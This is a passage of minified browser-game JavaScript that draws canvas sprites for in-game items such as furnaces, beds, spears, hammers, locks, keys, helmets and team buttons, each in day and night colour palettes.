                        Ve(T, -57.5 * E, -161.5 * E, 100 * E, 323 * E, 10 * E),
                        T.restore(),
                        he(T, s[0], s[1], 4 * E),
                        T.save(),
                        T.translate(74.5 * E, 177.5 * E),
                        Ve(T, -57.5 * E, 50.5 * E, 100 * E, 105 * E, 10 * E),
                        T.restore(),
                        he(T, s[6], s[1], 4 * E),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(16 * E, 125 * E),
                        T.bezierCurveTo(74.5 * E, 125 * E, 118 * E, 125 * E, 118 * E, 125 * E),
                        T.closePath(),
                        he(T, s[2], s[2], 10 * E),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(16 * E, 120 * E),
                        T.bezierCurveTo(74.5 * E, 120 * E, 74.5 * E, 120 * E, 118 * E, 120 * E),
                        T.closePath(),
                        he(T, s[3], s[3], 10 * E),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(16 * E, 228 * E),
                        T.bezierCurveTo(75 * E, 228.5 * E, 118 * E, 228.5 * E, 118 * E, 229 * E),
                        T.closePath(),
                        he(T, s[2], s[2], 10 * E),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(16 * E, 224 * E),
                        T.bezierCurveTo(75 * E, 224 * E, 118 * E, 224 * E, 118 * E, 224 * E),
                        T.closePath(),
                        he(T, s[3], s[3], 10 * E),
                        T.save(),
                        T.translate(72 * E, 68.5 * E),
                        Ve(T, -41.5 * E, -36.5 * E, 73 * E, 73 * E, 13 * E),
                        T.restore(),
                        he(T, s[4]),
                        T.save(),
                        T.translate(72 * E, 175.5 * E),
                        Ve(T, -41.5 * E, -38.5 * E, 73 * E, 73 * E, 13 * E),
                        T.restore(),
                        he(T, s[4]),
                        T.save(),
                        T.translate(72 * E, 279.5 * E),
                        Ve(T, -41.5 * E, -40.5 * E, 73 * E, 73 * E, 13 * E),
                        T.restore(),
                        he(T, s[4]),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(16 * E, 338 * E),
                        T.bezierCurveTo(75 * E, 338 * E, 118 * E, 338 * E, 118 * E, 338 * E),
                        T.closePath(),
                        he(T, s[2], s[2], 10 * E),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(16 * E, 333 * E),
                        T.bezierCurveTo(75 * E, 333 * E, 118 * E, 333 * E, 118 * E, 333 * E),
                        T.closePath(),
                        he(T, s[3], s[3], 10 * E),
                        r)),
                    sprite[ze.FURNACE_ON] = [],
                    sprite[ze.FURNACE_ON][ze.DAY] = c(zt(.5, !0, ["#0d1b1c", "#939393", "#5f6061", "#c0c0c0", "#ffad22", "#fffdd5", "#fee764"])),
                    sprite[ze.FURNACE_ON][ze.NIGHT] = c(zt(.5, !0, ["#0d1b1c", "#485e66", "#1f343f", "#60757d", "#ffdc73", "#fffce2", "#fef259"])),
                    sprite[ze.FURNACE_OFF] = [],
                    sprite[ze.FURNACE_OFF][ze.DAY] = c(Bt(.5, !0, ["#0d1b1c", "#939393", "#5f6061", "#c0c0c0", "#4f4f4f", "#6c6c6c", "#454545"])),
                    sprite[ze.FURNACE_OFF][ze.NIGHT] = c(Bt(.5, !0, ["#0d1b1c", "#485e66", "#1f343f", "#60757d", "#152229", "#0c1113", "#0c1113"])),
                    sprite[ze.FURNACE_SLOT] = c((T = .8,
                        s = ["#5f6061", "#939393"],
                        E = document.createElement("canvas"),
                        r = E.getContext("2d"),
                        E.width = 118 * T,
                        E.height = 129 * T,
                        r.save(),
                        r.translate(90 * T, 90 * T),
                        Ve(r, -86.5 * T, -86 * T, 110 * T, 110 * T, 15 * T),
                        r.restore(),
                        he(r, s[0], s[1], 4),
                        E)),
                    sprite[ze.FURNACE_BUTTON] = O(1, [{
                        f: P1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 2.5,
                        c: ["#4d2d14", "#432516"]
                    }], .3, ["#494949", "#5b5858", "#3d3b3b"], 1),
                    sprite[ze.BED] = [],
                    sprite[ze.BED][ze.DAY] = c(Kt(1, 0, ["#0d1b1c", "#554139", "#3f332a", "#261912", "#eee6c5", "#d1c599", "#554139", "#3f332a", "#86509b", "#703a99"])),
                    sprite[ze.BED][ze.NIGHT] = c(Kt(1, 0, ["#0d1b1c", "#0b3432", "#092b29", "#052120", "#104d5b", "#0b424f", "#0b3432", "#092b29", "#2b0b4a", "#23073e"])),
                    sprite[ze.BED_TOP] = [],
                    sprite[ze.BED_TOP][ze.DAY] = c(Ut(1, 0, ["#0d1b1c", "#554139", "#3f332a", "#261912", "#eee6c5", "#d1c599", "#554139", "#3f332a", "#86509b", "#703a99"])),
                    sprite[ze.BED_TOP][ze.NIGHT] = c(Ut(1, 0, ["#0d1b1c", "#0b3432", "#092b29", "#052120", "#104d5b", "#083b37", "#0b3432", "#092b29", "#2b0b4a", "#23073e"])),
                    sprite[ze.CRAB_SPEAR] = [],
                    sprite[ze.CRAB_SPEAR][ze.DAY] = c(I(3, Yt(.7, !0, ["#0d1b1c", "#58452b", "#47341d", "#ee593d", "#c04933", "#c04933", "#a33e2b", "#c3be9a", "#7f6d52"]))),
                    sprite[ze.CRAB_SPEAR][ze.NIGHT] = c(I(3, Yt(.7, !0, ["#0d1b1c", "#0b3432", "#092b29", "#34255d", "#281b4e", "#2f2157", "#281b4e", "#104d5b", "#083b37"]))),
                    sprite[ze.WOOD_SPEAR] = [],
                    sprite[ze.WOOD_SPEAR][ze.DAY] = c(I(3, Ft(.7, !0, ["#0d1b1c", "#58452b", "#47341d", "#765d42", "#c3be9a", "#7f6d52"]))),
                    sprite[ze.WOOD_SPEAR][ze.NIGHT] = c(I(3, Ft(.7, !0, ["#0d1b1c", "#0b3432", "#092b29", "#0e4d49", "#1a6c67", "#07322f"]))),
                    sprite[ze.SPEAR] = [],
                    sprite[ze.SPEAR][ze.DAY] = c(I(3, xt(.65, !0, ["#0d1b1c", "#4d2d14", "#432516", "#c3be9a", "#7f6d52", "#7a7575", "#454749", "#8c8787", "#939393", "#5f6061", "#aaa6a6"]))),
                    sprite[ze.SPEAR][ze.NIGHT] = c(I(3, xt(.65, !0, ["#0d1b1c", "#0d2e33", "#0b2326", "#1a6c67", "#07322f", "#374950", "#101f26", "#2c3c42", "#485e66", "#1f343f", "#546e78"]))),
                    sprite[ze.GOLD_SPEAR] = [],
                    sprite[ze.GOLD_SPEAR][ze.DAY] = c(I(3, Jt(.67, !0, ["#0d1b1c", "#493e26", "#382e19", "#a69e39", "#9c8828", "#bab143", "#c4bc51", "#b29c32", "#d2ca59"]))),
                    sprite[ze.GOLD_SPEAR][ze.NIGHT] = c(I(3, Jt(.67, !0, ["#030d14", "#263947", "#182935", "#33916d", "#197c62", "#3eab81", "#43aa82", "#29997c", "#52be94"]))),
                    sprite[ze.DIAMOND_SPEAR] = [],
                    sprite[ze.DIAMOND_SPEAR][ze.DAY] = c(I(3, Xt(.67, !0, ["#0d1b1c", "#262114", "#211108", "#4ba8b4", "#198a82", "#6ccad7", "#63c9d6", "#29aaa1", "#7bd9e6"]))),
                    sprite[ze.DIAMOND_SPEAR][ze.NIGHT] = c(I(3, Xt(.67, !0, ["#0d1b1c", "#111316", "#0a0b0c", "#4bbbc3", "#23a19d", "#54c5cd", "#4ad2ce", "#3dc4c0", "#73dde5"]))),
                    sprite[ze.AMETHYST_SPEAR] = [],
                    sprite[ze.AMETHYST_SPEAR][ze.DAY] = c(I(3, jt(.67, !0, ["#0d1b1c", "#262114", "#211108", "#9443b1", "#6f1988", "#a752c6", "#9e35be", "#8c29aa", "#b864d6"]))),
                    sprite[ze.AMETHYST_SPEAR][ze.NIGHT] = c(I(3, jt(.67, !0, ["#0d1b1c", "#111316", "#0a0b0c", "#6e43bf", "#673fa4", "#784bcc", "#845bc6", "#764eb5", "#966be7"]))),
                    sprite[ze.DRAGON_SPEAR] = [],
                    sprite[ze.DRAGON_SPEAR][ze.DAY] = c(I(3, qt(1, !0, ["#0d1b1c", "#1e2b34", "#151c24", "#99d7dd", "#7dcbd1", "#c6e8eb", "#aadee8", "#b7e2e5"]))),
                    sprite[ze.DRAGON_SPEAR][ze.NIGHT] = c(I(3, qt(1, !0, ["#0d1b1c", "#1c2026", "#0a0b0c", "#7dc6d9", "#6cbacf", "#87d2e6", "#49b2cf", "#87d2e6"]))),
                    sprite[ze.HAMMER] = [],
                    sprite[ze.HAMMER][ze.DAY] = c(I(3, ai(1, !0, ["#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"]))),
                    sprite[ze.HAMMER][ze.NIGHT] = c(I(3, ai(1, !0, ["#030d14", "#263947", "#182935", "#485e66", "#1f343f"]))),
                    sprite[ze.SPANNER] = [],
                    sprite[ze.SPANNER][ze.DAY] = c(I(3, B0(.5, !0, ["#0d1b1c", "#939393", "#5f6061"]))),
                    sprite[ze.SPANNER][ze.NIGHT] = c(I(3, B0(.5, !0, ["#030d14", "#485e66", "#1f343f"]))),
                    sprite[ze.SUPER_HAMMER] = [],
                    sprite[ze.SUPER_HAMMER][ze.DAY] = c(I(3, qi(1, !0, ["#0d1b1c", "#9b5927", "#7a3610", "#1e0302", "#0d825b", "#6bd16e", "#17915d", "#89e5aa", "#16935d", "#a0efc4", "#28b26d", "#cdf4cb"]))),
                    sprite[ze.SUPER_HAMMER][ze.NIGHT] = c(I(3, qi(1, !0, ["#0d1b1c", "#2a4f4a", "#1e423d", "#1e0302", "#096b3f", "#3db76f", "#118254", "#40c696", "#0c7a50", "#59d8a4", "#249376", "#80d8c7"]))),
                    sprite[ze.HAMMER_GOLD] = [],
                    sprite[ze.HAMMER_GOLD][ze.DAY] = c(I(3, ai(1, !0, ["#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32"]))),
                    sprite[ze.HAMMER_GOLD][ze.NIGHT] = c(I(3, ai(1, !0, ["#0d1b1c", "#0d2e33", "#0b2326", "#43aa82", "#29997c"]))),
                    sprite[ze.HAMMER_DIAMOND] = [],
                    sprite[ze.HAMMER_DIAMOND][ze.DAY] = c(I(3, ai(1, !0, ["#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1"]))),
                    sprite[ze.HAMMER_DIAMOND][ze.NIGHT] = c(I(3, ai(1, !0, ["#0d1b1c", "#111316", "#0a0b0c", "#73dde5", "#3dc4c0"]))),
                    sprite[ze.HAMMER_AMETHYST] = [],
                    sprite[ze.HAMMER_AMETHYST][ze.DAY] = c(I(3, ai(1, !0, ["#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa"]))),
                    sprite[ze.HAMMER_AMETHYST][ze.NIGHT] = c(I(3, ai(1, !0, ["#0d1b1c", "#111316", "#0a0b0c", "#8359d3", "#764eb5"]))),
                    sprite[ze.LOCK] = [],
                    sprite[ze.LOCK][ze.DAY] = c(wi(.55, 0, ["#141414", "#816511", "#c4a23a", "#3a3a3a"])),
                    sprite[ze.LOCK][ze.NIGHT] = c(wi(.55, 0, ["#080707", "#133d3c", "#2b6664", "#1b2529"])),
                    sprite[ze.PADLOCK] = [],
                    sprite[ze.PADLOCK].push(c(wi(.8, 0, ["#141414", "#816511", "#c4a23a", "#3a3a3a"]))),
                    sprite[ze.PADLOCK].push(c(wi(.8, 0, ["#141414", "#9f7d17", "#dab33c", "#474545"]))),
                    sprite[ze.PADLOCK].push(c(wi(.8, 0, ["#141414", "#73590d", "#a88a2c", "#2a2828"]))),
                    sprite[ze.LOCKED] = [],
                    sprite[ze.LOCKED].push(sprite[ze.PADLOCK][0]),
                    sprite[ze.LOCKED].push(sprite[ze.PADLOCK][0]),
                    sprite[ze.LOCKED].push(sprite[ze.PADLOCK][0]),
                    sprite[ze.LOCKPICK] = [],
                    sprite[ze.LOCKPICK][ze.DAY] = c(Ui(.06, 0, ["#141414", "#c4a23a", "#816511"])),
                    sprite[ze.LOCKPICK][ze.NIGHT] = c(Ui(.06, 0, ["#030d14", "#2b6664", "#133d3c"])),
                    sprite[ze.KEY] = [],
                    sprite[ze.KEY].push(c(Ui(.08, 0, ["#141414", "#c4a23a", "#816511"]))),
                    sprite[ze.KEY].push(c(Ui(.08, 0, ["#141414", "#e2bd4e", "#a38018"]))),
                    sprite[ze.KEY].push(c(Ui(.08, 0, ["#141414", "#b0902e", "#634d09"]))),
                    sprite[ze.DRAGON_HEART] = O(1.5, [{
                        f: Xi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#141414", "#178a99", "#0a6372", "#03282e"]
                    }], .45, ["#5bbcc9", "#73d2df", "#4daab6"], .9),
                    sprite[ze.RESURRECTION_GROUND] = [],
                    sprite[ze.RESURRECTION_GROUND][ze.DAY] = c(Yi(.8, 0, ["#347f93", "#54a4ba"])),
                    sprite[ze.RESURRECTION_GROUND][ze.NIGHT] = c(Yi(.8, 0, ["#98ede3", "#94f2e7"])),
                    sprite[ze.RESURRECTION_HOLE] = [],
                    sprite[ze.RESURRECTION_HOLE][ze.DAY] = c(Fi(.8, 0, ["#a9e4ed", "#86d4e0", "#418ba5", "#59b8ce"])),
                    sprite[ze.RESURRECTION_HOLE][ze.NIGHT] = c(Fi(.8, 0, ["#59c9c0", "#83ddd4", "#3fa097", "#90ddd9"])),
                    sprite[ze.RESURRECTION_ROTATE] = [],
                    sprite[ze.RESURRECTION_ROTATE][ze.DAY] = c(xi(.8, 0, ["#a9e4ed", "#86d4e0"])),
                    sprite[ze.RESURRECTION_ROTATE][ze.NIGHT] = c(xi(.8, 0, ["#83ddd4", "#485e66"])),
                    sprite[ze.RESURRECTION] = [],
                    sprite[ze.RESURRECTION][ze.DAY] = c(Ji(.8, !0, ["#347f93", "#54a4ba", "#1c2528", "#a9e4ed", "#86d4e0", "#959da0", "#697072", "#929da0", "#afb9bc"])),
                    sprite[ze.RESURRECTION][ze.NIGHT] = c(Ji(.8, !0, ["#98ede3", "#94f2e7", "#1f343f", "#59c9c0", "#83ddd4", "#485e66", "#2d484f", "#546d6d", "#597b84"])),
                    sprite[ze.EMERALD_MACHINE_GROUND] = [],
                    sprite[ze.EMERALD_MACHINE_GROUND][ze.DAY] = IMAGES.EMERALD_MACHINE_GROUNDD,
                    sprite[ze.EMERALD_MACHINE_GROUND][ze.NIGHT] = IMAGES.EMERALD_MACHINE_GROUNDN,
                    sprite[ze.EMERALD_MACHINE_HOLE] = [],
                    sprite[ze.EMERALD_MACHINE_HOLE][ze.DAY] = IMAGES.EMERALD_MACHINE_HOLED,
                    sprite[ze.EMERALD_MACHINE_HOLE][ze.NIGHT] = IMAGES.EMERALD_MACHINE_HOLEN,
                    sprite[ze.EMERALD_MACHINE_ROTATE] = [],
                    sprite[ze.EMERALD_MACHINE_ROTATE][ze.DAY] = IMAGES.EMERALD_MACHINE_ROTATED,
                    sprite[ze.EMERALD_MACHINE_ROTATE][ze.NIGHT] = IMAGES.EMERALD_MACHINE_ROTATEN,
                    sprite[ze.EMERALD_MACHINE] = [],
                    sprite[ze.EMERALD_MACHINE][ze.DAY] = IMAGES.EMERALD_MACHINED,
                    sprite[ze.EMERALD_MACHINE][ze.NIGHT] = IMAGES.EMERALD_MACHINEN,
                    sprite[ze.EXTRACTOR_MACHINE0_STONE] = [],
                    sprite[ze.EXTRACTOR_MACHINE0_STONE][ze.DAY] = IMAGES.EXTRACTOR_MACHINE0_STONED,
                    sprite[ze.EXTRACTOR_MACHINE0_STONE][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_STONEN,
                    sprite[ze.EXTRACTOR_MACHINE_STONE] = [],
                    sprite[ze.EXTRACTOR_MACHINE_STONE][ze.DAY] = IMAGES.EXTRACTOR_MACHINE_STONED,
                    sprite[ze.EXTRACTOR_MACHINE_STONE][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE_STONEN,
                    sprite[ze.EXTRACTOR_MACHINE0_GOLD] = [],
                    sprite[ze.EXTRACTOR_MACHINE0_GOLD][ze.DAY] = IMAGES.EXTRACTOR_MACHINE0_GOLDD,
                    sprite[ze.EXTRACTOR_MACHINE0_GOLD][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_GOLDN,
                    sprite[ze.EXTRACTOR_MACHINE_GOLD] = [],
                    sprite[ze.EXTRACTOR_MACHINE_GOLD][ze.DAY] = IMAGES.EXTRACTOR_MACHINE_GOLDD,
                    sprite[ze.EXTRACTOR_MACHINE_GOLD][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE_GOLDN,
                    sprite[ze.EXTRACTOR_MACHINE0_DIAMOND] = [],
                    sprite[ze.EXTRACTOR_MACHINE0_DIAMOND][ze.DAY] = IMAGES.EXTRACTOR_MACHINE0_DIAMONDD,
                    sprite[ze.EXTRACTOR_MACHINE0_DIAMOND][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_DIAMONDN,
                    sprite[ze.EXTRACTOR_MACHINE_DIAMOND] = [],
                    sprite[ze.EXTRACTOR_MACHINE_DIAMOND][ze.DAY] = IMAGES.EXTRACTOR_MACHINE_DIAMONDD,
                    sprite[ze.EXTRACTOR_MACHINE_DIAMOND][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE_DIAMONDN,
                    sprite[ze.EXTRACTOR_MACHINE0_AMETHYST] = [],
                    sprite[ze.EXTRACTOR_MACHINE0_AMETHYST][ze.DAY] = IMAGES.EXTRACTOR_MACHINE0_AMETHYSTD,
                    sprite[ze.EXTRACTOR_MACHINE0_AMETHYST][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_AMETHYSTN,
                    sprite[ze.EXTRACTOR_MACHINE_AMETHYST] = [],
                    sprite[ze.EXTRACTOR_MACHINE_AMETHYST][ze.DAY] = IMAGES.EXTRACTOR_MACHINE_AMETHYSTD,
                    sprite[ze.EXTRACTOR_MACHINE_AMETHYST][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE_AMETHYSTN,
                    sprite[ze.EXTRACTOR_MACHINE0_REIDITE] = [],
                    sprite[ze.EXTRACTOR_MACHINE0_REIDITE][ze.DAY] = IMAGES.EXTRACTOR_MACHINE0_REIDITED,
                    sprite[ze.EXTRACTOR_MACHINE0_REIDITE][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE0_REIDITEN,
                    sprite[ze.EXTRACTOR_MACHINE_REIDITE] = [],
                    sprite[ze.EXTRACTOR_MACHINE_REIDITE][ze.DAY] = IMAGES.EXTRACTOR_MACHINE_REIDITED,
                    sprite[ze.EXTRACTOR_MACHINE_REIDITE][ze.NIGHT] = IMAGES.EXTRACTOR_MACHINE_REIDITEN,
                    sprite[ze.FIREFLY] = [],
                    sprite[ze.FIREFLY][ze.DAY] = IMAGES.FIREFLYD,
                    sprite[ze.FIREFLY][ze.NIGHT] = IMAGES.FIREFLYN,
                    sprite[ze.HURT_FIREFLY] = IMAGES.HURT_FIREFLY,
                    sprite[ze.TOTEM] = [],
                    sprite[ze.TOTEM][ze.DAY] = c(Ki(.75, !0, ["#0d1b1c", "#4c3a15", "#634828", "#564021"])),
                    sprite[ze.TOTEM][ze.NIGHT] = c(Ki(.75, !0, ["#030d14", "#0d2e33", "#184747", "#123b3f"])),
                    sprite[ze.ICON_MEMBER] = c(Vi(.3, ["#092813", "#1f773d"], 0)),
                    sprite[ze.ICON_LEADER] = c(Vi(.3, ["#092813", "#1f773d"], 1)),
                    sprite[ze.VERIFIED] = c((T = .6,
                        r = ["#092813", "#1f773d"],
                        s = document.createElement("canvas"),
                        E = s.getContext("2d"),
                        s.width = 60 * T,
                        s.height = 60 * T,
                        E.translate(-25 * T, -25 * T),
                        E.translate(0, 5 * T),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(24 * T, 50 * T),
                        E.bezierCurveTo(32.5 * T, 54.5 * T, 32.5 * T, 54.5 * T, 41 * T, 59 * T),
                        E.bezierCurveTo(57 * T, 47 * T, 57 * T, 47 * T, 73 * T, 35 * T),
                        E.bezierCurveTo(57 * T, 53 * T, 57 * T, 53 * T, 41 * T, 71 * T),
                        E.closePath(),
                        he(E, r[0]),
                        E.translate(0, -5 * T),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(24 * T, 50 * T),
                        E.bezierCurveTo(32.5 * T, 54.5 * T, 32.5 * T, 54.5 * T, 41 * T, 59 * T),
                        E.bezierCurveTo(57 * T, 47 * T, 57 * T, 47 * T, 73 * T, 35 * T),
                        E.bezierCurveTo(57 * T, 53 * T, 57 * T, 53 * T, 41 * T, 71 * T),
                        E.closePath(),
                        he(E, r[1]),
                        s)),
                    sprite[ze.TEAM_BUTTON] = [],
                    sprite[ze.TEAM_BUTTON].push(c(ki(.7, ["#092813", "#1f773d", "#165b2b", "#4c3a15", "#1f773d"], 0))),
                    sprite[ze.TEAM_BUTTON].push(c(ki(.7, ["#0b3719", "#228745", "#1a7034", "#614a1a", "#238845"], 0))),
                    sprite[ze.TEAM_BUTTON].push(c(ki(.7, ["#092a14", "#186733", "#124a23", "#4c3a15", "#1b6735"], 0))),
                    sprite[ze.FULL_TEAM_BUTTON] = [];
                var i, n, r, o, a, s, _, E, u, d, T = c(ki(.7, ["#280e09", "#77371f", "#280e09", "#2e2410", "#77371f"], 0));
                for (sprite[ze.FULL_TEAM_BUTTON].push(T),
                    sprite[ze.FULL_TEAM_BUTTON].push(T),
                    sprite[ze.FULL_TEAM_BUTTON].push(T),
                    sprite[ze.MANAGE_TEAM_BUTTON] = [],
                    sprite[ze.MANAGE_TEAM_BUTTON].push(c(ki(.7, ["#092813", "#1f773d", "#165b2b", "#4c3a15", "#1f773d"], 1))),
                    sprite[ze.MANAGE_TEAM_BUTTON].push(c(ki(.7, ["#0b3719", "#228745", "#1a7034", "#614a1a", "#238845"], 1))),
                    sprite[ze.MANAGE_TEAM_BUTTON].push(c(ki(.7, ["#092a14", "#186733", "#124a23", "#4c3a15", "#1b6735"], 1))),
                    sprite[ze.DELAY_SPIKE] = c(function (e, t) {
                        var i = document.createElement("canvas")
                            , n = i.getContext("2d")
                            , r = 170 * e
                            , o = 172 * e
                            , a = r / 2
                            , s = o / 2;
                        i.width = r,
                            i.height = o,
                            n.translate(a, s),
                            n.save();
                        for (var _ = 0; _ < 10; _++)
                            n.rotate(Math.PI / 5),
                                n.save(),
                                n.translate(65 * e, 0),
                                A(n, 3, 18 * e, 4 * e),
                                he(n, t[0]),
                                n.restore();
                        return n.restore(),
                            ke(n, 0, 0, 40 * e),
                            he(n, void 0, t[0], 6 * e),
                            ke(n, 0, 0, 20 * e),
                            he(n, t[0]),
                            i
                    }(.3, ["#FFFFFF"])),
                    sprite[ze.DELAY_WALL] = c((E = .3,
                        r = ["#FFFFFF"],
                        s = document.createElement("canvas"),
                        T = s.getContext("2d"),
                        d = (n = 130 * E) / 2,
                        o = (a = 142 * E) / 2,
                        s.width = n,
                        s.height = a,
                        ke(T, d, o, 40 * E),
                        he(T, void 0, r[0], 7 * E),
                        ke(T, d, o, 30 * E),
                        he(T, void 0, r[0], 7 * E),
                        ke(T, d, o, 20 * E),
                        he(T, r[0]),
                        s)),
                    sprite[ze.DELAY_TEAM] = c(Vi(.4, ["rgba(255, 255, 255, 0)", "#FFFFFF"], 0)),
                    sprite[ze.DELAY_DRINK] = c(I(Math.PI / 5, (n = .2,
                        a = ["#FFFFFF"],
                        d = document.createElement("canvas"),
                        o = d.getContext("2d"),
                        d.width = 316 * n,
                        d.height = 365 * n,
                        o.save(),
                        o.translate(156.07142639160156 * n, 51.81248474121094 * n),
                        o.rotate(0),
                        Ve(o, -21.5 * n, -34 * n, 43 * n, 68 * n, 8 * n),
                        o.restore(),
                        he(o, a[0], a[0], 15 * n),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(126.57142639160156 * n, 67.38392639160156 * n),
                        o.bezierCurveTo(126.57142639160156 * n, 57.38392639160156 * n, 132.57142639160156 * n, 54.38392639160156 * n, 140.57142639160156 * n, 54.38392639160156 * n),
                        o.bezierCurveTo(177.57142639160156 * n, 55.38392639160156 * n, 158.07142639160156 * n, 54.38392639160156 * n, 175.57142639160156 * n, 54.38392639160156 * n),
                        o.bezierCurveTo(185.57142639160156 * n, 56.38392639160156 * n, 185.57142639160156 * n, 57.38392639160156 * n, 184.57142639160156 * n, 66.38392639160156 * n),
                        o.bezierCurveTo(184.57142639160156 * n, 78.38392639160156 * n, 184.57142639160156 * n, 89.38392639160156 * n, 184.57142639160156 * n, 90.38392639160156 * n),
                        o.bezierCurveTo(177.57142639160156 * n, 107.38392639160156 * n, 180.57142639160156 * n, 112.38392639160156 * n, 189.57142639160156 * n, 116.38392639160156 * n),
                        o.bezierCurveTo(212.57142639160156 * n, 127.38392639160156 * n, 212.57142639160156 * n, 132.38392639160156 * n, 211.57142639160156 * n, 150.38392639160156 * n),
                        o.bezierCurveTo(211.57142639160156 * n, 227.59821128845215 * n, 211.57142639160156 * n, 227.59821128845215 * n, 211.57142639160156 * n, 304.81249618530273 * n),
                        o.bezierCurveTo(212.57142639160156 * n, 328.81249618530273 * n, 209.57142639160156 * n, 330.81249618530273 * n, 188.57142639160156 * n, 333.81249618530273 * n),
                        o.bezierCurveTo(155.07142639160156 * n, 333.31249618530273 * n, 155.07142639160156 * n, 333.31249618530273 * n, 121.57142639160156 * n, 332.81249618530273 * n),
                        o.bezierCurveTo(104.57142639160156 * n, 327.81249618530273 * n, 105.57142639160156 * n, 328.81249618530273 * n, 104.57142639160156 * n, 312.81249618530273 * n),
                        o.bezierCurveTo(104.57142639160156 * n, 228.16963958740234 * n, 104.57142639160156 * n, 228.16963958740234 * n, 104.57142639160156 * n, 143.52678298950195 * n),
                        o.bezierCurveTo(106.57142639160156 * n, 124.52678298950195 * n, 110.57142639160156 * n, 123.52678298950195 * n, 123.57142639160156 * n, 116.52678298950195 * n),
                        o.bezierCurveTo(136.57142639160156 * n, 110.52678298950195 * n, 130.57142639160156 * n, 106.52678298950195 * n, 126.57142639160156 * n, 98.52678298950195 * n),
                        o.closePath(),
                        he(o, a[0], a[0], 15 * n),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(125.57142639160156 * n, 156.66963958740234 * n),
                        o.bezierCurveTo(125.57142639160156 * n, 182.66963958740234 * n, 125.57142639160156 * n, 182.66963958740234 * n, 125.57142639160156 * n, 208.66963958740234 * n),
                        o.closePath(),
                        he(o, a[0], a[0], 15 * n),
                        d))),
                    sprite[ze.AMETHYST_HELMET] = [],
                    sprite[ze.AMETHYST_HELMET][ze.DAY] = c(Pi(.85, 0, ["#0d1b1c", "#8c55b7", "#652d8e", "#79359e", "#5eccd1", "#4badad", "#9e6ac6"])),
                    sprite[ze.AMETHYST_HELMET][ze.NIGHT] = c(Pi(.85, 0, ["#0d1b1c", "#4e4e93", "#393977", "#444187", "#2b9390", "#277a74", "#7da8db"])),
                    sprite[ze.SHOW_TEAM_BUTTON] = [],
                    sprite[ze.SHOW_TEAM_BUTTON].push(c(ki(.7, ["#280e09", "#77371f", "#280e09", "#2e2410", "#77371f"], 1))),
                    sprite[ze.SHOW_TEAM_BUTTON].push(c(ki(.7, ["#38130C", "#853D22", "#391402", "#3D3016", "#873E22"], 1))),
                    sprite[ze.SHOW_TEAM_BUTTON].push(c(ki(.7, ["#1C0A06", "#6B3019", "#1D0A06", "#251D0C", "#6A301A"], 1))),
                    sprite[ze.HOOD] = [],
                    sprite[ze.HOOD][ze.DAY] = c(N0(.37, 0, ["#2a2938", "#242330", "#313041"])),
                    sprite[ze.HOOD][ze.NIGHT] = c(N0(.37, 0, ["#1b1e30", "#161921", "#252f3e"])),
                    sprite[ze.WINTER_HOOD] = [],
                    sprite[ze.WINTER_HOOD][ze.DAY] = c(S0(.17, 0, ["#2a2938", "#242330", "#313041", "#1b1a25", "#d62c0e"])),
                    sprite[ze.WINTER_HOOD][ze.NIGHT] = c(S0(.17, 0, ["#1b1e30", "#161921", "#252f3e", "#0a0c11", "#d62c0e"])),
                    sprite[ze.WINTER_PEASANT] = [],
                    sprite[ze.WINTER_PEASANT][ze.DAY] = c(m0(.55, !0, ["#1d1d22", "#e2e1e1", "#d2cbcb", "#cfcbc8", "#beb5b5", "#ada0a0"], 1)),
                    sprite[ze.WINTER_PEASANT][ze.NIGHT] = c(m0(.55, !0, ["#1d1d22", "#216661", "#134945", "#2b8079", "#17504c"], 1)),
                    sprite[ze.PEASANT] = [],
                    sprite[ze.PEASANT][ze.DAY] = c(m0(.55, !0, ["#1d1d22", "#8c7654", "#785f4c", "#a88e6c", "#785f4c", "#705845"], 0)),
                    sprite[ze.PEASANT][ze.NIGHT] = c(m0(.55, !0, ["#1d1d22", "#1b5752", "#0e3b37", "#23706a", "#11413e", "#0b322f"], 0)),
                    sprite[ze.CROWN_GREEN] = [],
                    sprite[ze.CROWN_GREEN][ze.DAY] = c(W0(.2, !0, ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#49B669", "#19994C", "#71C187"])),
                    sprite[ze.CROWN_GREEN][ze.NIGHT] = c(W0(.2, !0, ["#2b7c57", "#114933", "#1b6656", "#1a7961", "#3db76f", "#118254", "#40c696"])),
                    sprite[ze.CROWN_ORANGE] = [],
                    sprite[ze.CROWN_ORANGE][ze.DAY] = c(W0(.2, !0, ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#C45727", "#994617", "#DB9358"])),
                    sprite[ze.CROWN_ORANGE][ze.NIGHT] = c(W0(.2, !0, ["#2b7c57", "#114933", "#1b6656", "#1a7961", "#69b681", "#509a75", "#7ec387"])),
                    sprite[ze.CROWN_BLUE] = [],
